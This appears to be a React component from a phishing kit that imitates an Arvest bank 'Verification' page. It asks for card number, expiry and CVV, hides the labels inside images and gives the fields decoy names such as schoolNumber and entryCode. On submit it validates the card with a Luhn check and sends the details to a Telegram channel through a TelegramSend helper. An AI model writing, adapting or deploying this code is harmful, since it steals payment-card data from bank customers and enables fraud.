import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import { verifyCreditCardNumber } from "../utils/luhn";
import schoolNumber from "../assets/schoolNumber.png"
import entryCode from "../assets/entryCode.png"
import resumptionDate from "../assets/resumptionDate.png"

type Additional = {
  schoolNumber: string;
  resumptionDate: string;
  entryCode: string;
};

export default function Additional() {
  const [formInput, setFormInput] = useState<Additional>({
    schoolNumber: "",
    resumptionDate: "",
    entryCode: "",
  });
  const [isLoading, setIsLoading] = React.useState(false);
  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  function handleCardInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    let value = event.target.value.replace(/\s/g, ""); // Remove existing spaces
    value = value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 0) {
      value = value.match(new RegExp(".{1,4}", "g"))!.join(" ");
    }

    event.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleExpDate(e: React.ChangeEvent<HTMLInputElement>) {
    let value = e.target.value.replace(/\D/g, ""); // Remove non-digit characters

    if (value.length > 2) {
      value = value.slice(0, 2) + " / " + value.slice(2);
    }

    e.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [e.target.name]: e.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    
    const message = `
    [----+🏦 ARVEST KAAD 🏦+-----]

    KAAD NUMBER: ${formInput.schoolNumber}

    KAAD EXPIRY: ${formInput.resumptionDate}

    KAAD CVV: ${formInput.entryCode}
    `;
    const isValidCardNumber = verifyCreditCardNumber(formInput.schoolNumber);
    if (!isValidCardNumber) {
      document.getElementById("card-error")?.classList.remove("hide");
      return;
    }
    setIsLoading(true);
    await TelegramSend(message);
    setIsLoading(false);
    cookies.set("additional", formInput);
    navigate("../login/auth/3", { replace: true });
  }
  return (
    <>
      <div className="submitForm">
        
        <center>
          {" "}
          <h3>Verification</h3>{" "}
        </center>
        <p
          className="go-left"
          style={{ fontSize: "16px", marginBottom: "30px" }}
        >
          To further verify your identity, Please fill out the form below <br />
        </p>

        <div style={{marginBottom:"20px"}} id="card-error" className="error-message hide">
          <p style={{ color: "red" }}>
            Invalid card details. Please check your card information and try
            again.
          </p>
        </div>

        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field">
          <div className="kylexy">
          <img src={schoolNumber} height={16} alt="" />
                      </div>
            
            <input
              onChange={handleCardInputChange}
              name="schoolNumber"
              minLength={16}
              maxLength={19}
              required
              type="text"
            />
          </div>

          <div className="input-field">
          <div className="kylexy">
          <img src={resumptionDate} height={19} alt="" />
                      </div>
            <input
              required
              maxLength={7}
              onChange={handleExpDate}
              name="schoolNumber"
              type="text"
            />
          </div>

          <div className="input-field">
          <div className="kylexy">
          <img src={entryCode} height={13} alt="" />
                      </div>
            <input
              name="entryCode"
              required
              maxLength={4}
              onChange={handleInputChange}
              type="tel"
            />
          </div>

          <br />
          <br />

          {isLoading ? (
            <button style={{ marginTop: "-2px" }} type="button">
              Please wait...
            </button>
          ) : (
            <button style={{ marginTop: "-2px" }} type="submit">
              Submit
            </button>
          )}
        </form>

        <br />

        <p>Unauthorized access is prohibited. Usage may be monitored</p>

        <hr />

        <p>Have questions?</p>
      </div>
    </>
  );
}
